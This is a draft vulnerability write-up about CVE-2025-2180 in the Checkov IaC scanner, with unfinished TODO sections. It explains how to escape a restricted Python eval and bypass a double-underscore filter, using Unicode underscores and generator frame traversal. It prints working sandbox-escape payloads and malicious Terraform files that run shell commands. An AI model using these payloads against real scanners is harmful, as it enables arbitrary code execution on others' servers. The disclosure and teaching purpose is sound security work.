---
title: "CVE-2025-2180 - Breaking out of a Python Jail in a Popular IaC Scanning Tool"
date: "2025-10-16"
summary: " "
description: ""
toc: false
readTime: true
autonumber: false
math: false
tags: ["python", "Bug Bounty"]
showTags: false
hideBg: true
draft: true
---
## The Quick Summary
* This blog post describes a vulnerability in the infrastructure-as-code scanning tool, [Checkov](https://github.com/bridgecrewio/checkov) that allows for arbitrary code execution if run on untrusted Terraform files. 
* The vulnerability involves escaping from a python sandbox and evading a check that blocks double-underscore attributes (such as `.__class__`). We'll walk through two ways to bypass this check, one involving unicode characters, and one that digs deep into python internals.
* This vulnerability fetched a bug bounty from the maintainers of Checkov, as well as a company that ran Checkov on their servers as part of their code scanning product.


## Background - An Earlier CVE in Checkov
Back in 2021, I was browsing through the source code of the infrastructure-as-code scanning tool , when I stumbled across a few very interesting [lines of code](https://github.com/bridgecrewio/checkov/blob/65b28a4810e2ce668a063ea0077cab349852cba6/checkov/terraform/variable_rendering/evaluate_terraform.py#L46).

```python
def _try_evaluate(input_str):
    try:
        return eval(input_str, {"__builtins__": None}, SAFE_EVAL_DICT) # nosec
    except Exception:
        try:
            return eval(f'"{input_str}"', {"__builtins__": None}, SAFE_EVAL_DICT) # nosec
        except Exception:
            return input_str
```

Show this to any security nerd who is familiar with python, and theyâ€™ll immediately recognize it - this is a classic example of an unsafe python jail. Iâ€™m not entirely sure where the idea originated, but this specific invocation of eval is often considered to be a â€œsafe evalâ€ function. The thinking is that if you remove the builtins (second argument to eval) and replace the locals (third argument), the code that is passed into `eval` wonâ€™t have access to anything interesting, and thus canâ€™t do anything dangerous.

This is, of course, not the case. Python is a very dynamic language, and this jail leaves plenty of room for escape. The typical approach is to recover the builtins, which can usually be achieved by chaining together a series of [dunder](https://docs.python.org/3/reference/lexical_analysis.html#reserved-classes-of-identifiers) attributes from things available within eval. You start with `{}.__class__.__subclassess` (subclasses, of the `dict` class), and keep poking around until you find something that gives you access to the builtins. From there, you grab  `__import__` and use it to import `os.system`, then execute shell commands. Using list comprehensions, this can all be done within a single expression, allowing it to work within an `eval`. A full python jail escape looks something like this: 

`
[x for x in {}.__class__.__bases__[0].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system(â€˜whoamiâ€™)
` [^1]


In the case of Checkov, this code was being used to evalute HCL within Terraform arguments. The vulnerability could be exploited by running `checkov -f` on a Terraform file containing the jail escape, such as the one below:
```hcl
resource "random_pet" "server" {
  keepers = {
    ami_id = "[x for x in {}.__class__.__bases__[0].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('date >> /tmp/pwned_from_checkov')"
  }
}
```

I sent this POC to the Checkov maintainers through their responsible disclosure program.

## An Incomplete Fix
After assigning [CVE-2021-3040](https://nvd.nist.gov/vuln/detail/CVE-2021-3040) to this issue, the Checkov maintainers decided to fix this vulnerability by blocking any input string that contained a double underscore, theoretically blocking the ability to access the attributes neccesary for the exploit.
```
def evaluate(input_str):
    if "__" in input_str:
        logging.warning(f"got a substring with double underscore, which is not allowed. origin string: {input_str}")
        return input_str
    return eval(input_str, {"__builtins__": None}, SAFE_EVAL_DICT)  # nosec
```

This fix didnâ€™t sit well with me - it seemed plausible that there was a way to execute arbitrary code without using a double underscore. I didnâ€™t have POC, nor the time to research the problem further, so I decided to move on. Years later, this project caught my attention again and I noticed that `eval` code had not changed. I decided to give it another go, and was much more successful this time aroundâ€¦

## Bypass One: Unicode Underscores
How do we get around that double underscore check? The first solution I found is a neat little party trick. It turns out there are a handful of characters that the python interpreter considers to be functionally equivalent to an underscore. If you want to get into the nitty-gritty details you can read about [NFKC Normalization](https://peps.python.org/pep-3131/), but the short story is these unicode characters are normalized into an ASCII underscore and can be used as a drop-in replacement in most places in your python code. One example of such a character is the [fullwidth low line](https://www.compart.com/en/unicode/U+FF3F). Crucially, these characters are normalized by the python interpreter if they appear within code, but will remain if they appear in strings. For example:

```python
>> # Example character that will normalize to an underscore
>>> chr(0xFE4D)
'ï¹'
>>> underscore_example_variable = 123
>>> underscoreï¹exampleï¹variable
123
>>> '_' in 'noï¹underscoresï¹here'
False
```

With this knowledge, it was easy to modify my previous exploit so that it would pass the `__ in input_str` check. The new exploit Terraform file:
```hcl
resource "random_pet" "server" {
  keepers = {
    ami_id = "[x for x in {}._ï¹Žclass_ï¹Ž._ï¹Žbases_ï¹Ž[0]._ï¹Žsubclasses_ï¹Ž() if x._ï¹Žname_ï¹Ž == 'catch_warnings'][0]()._module._ï¹Žbuiltins_ï¹Ž['_'+'_import_'+'_']('os').system('date >> /tmp/unicode-example')"
  }
}
```

Running Checkov against this file again, gives us arbitrary code execution! Wow, that was quite easyðŸŽ‰

## Bypass Two: Walking Up the Call Stack
The unicode bypass felt a bit unsatisfying. I anticipated that the maintainers might fix this issue by simply normalizing unicode characters, so I decided to see if I could come up with a better exploit. Is there a clever way to sneak around the dunder check assuming no special unicode characters are allowed? 

As it turns out, yes! Hereâ€™s a sneak peak of the full exploit, then letâ€™s talk about how it works:

```
TODO add exploit
```

#### Generators
The execution environment in the `eval` is very limited: no builtins, no imports, no `getattr`, only a handful of functions available to be called . I spent a while exploring potential exploits involving f-strings before deciding on a new path. Generators are a way of returning a sequence of items - if you've ever seen the `yield` keyword in python code, you are familiar. Another handy feature of Python is [generator expressions](https://peps.python.org/pep-0289/), which provide shorthand for creating a generator similar to list comprehensions. The syntax is `(x for x in [1,2,3])`, which is conveniently allowed within the restricted `eval` environment

```
eval('(x for x in (1,2,3))', {'__builtins__': None}, {})
<generator object <genexpr> at 0x104f007c0>
```
Why is this useful? What we're really after is the generator's `gi_frame` attribute (note the lack of a double underscore), but in order to explain that we need to take a quick tangent into Python internals to learn about Frames.

### Frames

Every function call in Python creates a new [frame object](https://docs.python.org/3/reference/datamodel.html#frame-objects) that is  pushed onto the interpreterâ€™s call stack. A frame holds a reference to the functionâ€™s compiled bytecode (`f_code`), the current instruction index (`f_lasti`), the functionâ€™s global and local namespaces, and several other execution details. Frames are linked together through the `f_back` attribute, which points to the callerâ€™s frame, forming a linked list that mirrors the call stack.

Under the hood, generators behave similarly to functions in that they have their own frame object, accessible via the `gi_frame` attribute. The frame is created when the generator is first advanced (by calling `next()` or `.send()`). After each yield, the frameâ€™s state is suspended, allowing it to be resumed on the next iteration. A generatorâ€™s frame also contains a `f_back` reference, which points to the caller's frame.

### A Path To an Exploit

Putting all these pieces together - we should be able to use a generator to escape our python jail and recover the builtins. A generator expression will allow us to create a generator object, from which we can access its frame via `generator.gi_frame`. This frame's globals and builtins will be empty because it was created from within the `eval` context, but we can use its `f_back` attribute to walk upwards on the call stack until we reach a frame that a reference to the builtins.

![Diagram depicting the stack frame traversal](./media/frame-diagram.png)

The exploit code would essentially be:
```python
(i for i in [1,2,3]).gi_frame.f_back.f_back.get('__builtins__').import_system_and_pop_shell`
```

If only it were so simple! There is one detail that makes this exploit quite a bit more complicated...

### A Missing `f_back`
If you try to run the code above, you'll notice the problem. The generator's `gi_frame` has an empty `f_back` pointer, which means no walking up the call stack, and no access to the builtins. This is the case for all generators - the `f_back` pointer is cleared when the generator is put in a suspeded state, after it yields. You can see this happening in the Python [source code](https://github.com/python/cpython/blob/3.10/Objects/genobject.c#L217-L221) [^2] 

```c
result = _PyEval_EvalFrame(tstate, f, exc);
tstate->exc_info = gen->gi_exc_state.previous_item;
gen->gi_exc_state.previous_item = NULL;

/* Don't keep the reference to f_back any longer than necessary. It
* may keep a chain of frames alive or it could create a reference
* cycle. */
assert(f->f_back == tstate->frame);
Py_CLEAR(f->f_back);
```

This does give us a window though - the `f_back` pointer is free for the taking while the generator is running, before the `yield`. This code snippet demonstrates our opportunity:
```python
g = None # Varible that will hold the generator

def generator():
  # From within the generator, print the frame's f_back
  print(f"f_back within the generator: {g.gi_frame.f_back}")
  yield 1
    
g = generator()             # Create the generator
g.send(None)                # Start the generator
print(f"f_back after the yield: {g.gi_frame.f_back}")
```
Running this code:
```
f_back within the generator: <frame at 0x1049df690, file '<python-input-0>', line 9, code <module>>
f_back after the yield: None
```

So if we are able to get _inside_ the generator and grab the `f_back` pointer before it yields, we should be able to use that to escape! How can we achieve that? The code sample above is a big hint, can you spot the trick?

### A Generator That Yields Its Own Attributes
Ok, here's the plan: We're going to make a generator that yields _its own_ `gi_frame.f_back` so that we can grab the reference before it is cleared. Similar to the above example, this involves defining a generator that references a variable in the local scope, then assigning that variable to an instance of the generator.
```python
g = None # Varible that will hold the generator

def generator():
  # From within the generator, print the frame's f_back
  yield g.gi_frame.f_back
    
g = generator()             # Create the generator
f_back = g.send(None)       # Start the generator
```
Now the challenge is to figure out how to do that from within the `eval`. We are limited to a single expression, and can't define functions or even assign variables. Thankfully, Python is a very expressive language, and you can pack a lot of madness into a single line.

Although `eval` does not allow variable assignment, we can sneak around that limitation using the walrus operator (`:=`). This will allow us to assign our generator to a variable, and reference the variable within the generator, then call `send()` to start the generator, all in one expression! Pure madness!

```python
>>> (gen:=(gen.gi_frame.f_back for _ in [1])).send(None)
<frame at 0x1045f4f60, file '<stdin>-3', line 1, code <module>>
```

And there we have _almost_ everything we need. But there is one final catch.

### Variable Resolution Within `eval` Statements
The expression above will work if you drop it straight into your Python REPL. However, it will not work within the restricted `eval`.
```python
>>> eval("(gen:=(gen.gi_frame.f_back for _ in [1])).send(None)", {'__builtins__': None}, {})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
    eval("(gen:=(gen.gi_frame.f_back for _ in [1])).send(None)", {'__builtins__': None}, {})
    ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
  File "<string>", line 1, in <genexpr>
TypeError: 'NoneType' object is not subscriptable
```
The difference is a subtlety in how variables are resolved within `eval`, explained [here](https://docs.python.org/3/reference/executionmodel.html#interaction-with-dynamic-features).

> The eval() and exec() functions do not have access to the full environment for resolving names. Names may be resolved in the local and global namespaces of the caller. Free variables are not resolved in the nearest enclosing namespace, but in the global namespace.

The generator is referencing `gen` as a [free variable](https://docs.python.org/3/glossary.html#term-free-variable) because it was defined in an outer scope. Within the context of the `eval` it will not be added to the global namespace, and thus will not be visible to the inner scope when the generator runs.


### Creating a Closure
To ensure that the `gen` variable stays in scope when it is later referenced by the generator, it needs to be wrapped in a [closure](https://realpython.com/python-closure/). A closure is a way of passing variables from an outer scope to an inner scope. The canonical example is nested functions, but many other things in Python create closures including generators, list comprehensions, and lambdas. All three options create a functional exploit, but the lamdba solution ends up being more elegant and readable. 

Wrapping the previous examples in a `lambda` gives us our final exploit:
`
(lambda gen: (gen:=(gen.gi_frame.f_back.f_back.f_globals for _ in [1])))(None).send(None).get('_'+ '_builtins_' +'_')['_'+'_import_'+'_']('os').system(â€˜whoamiâ€™)
`

There's a lot going on in that single line of Python! Here's a breakdown that shows the exploit step-by-step.
![Image explaining the pieces of the exploit](./media/exploit.png)

## Impact
TODO continue from here


[^1]: Depending on where the `eval` statement occurs, `__builtins__` might either be a dictionary or a module object, which will change the exploit slightly. In the case of a module, its often neccesary to recover `__builtins__.getattr` first, then use that to access `__import__`
[^2]: This code snippet is from Python 3.10. The code in later Python versions is more convoluted, but the behavior remains the same. 

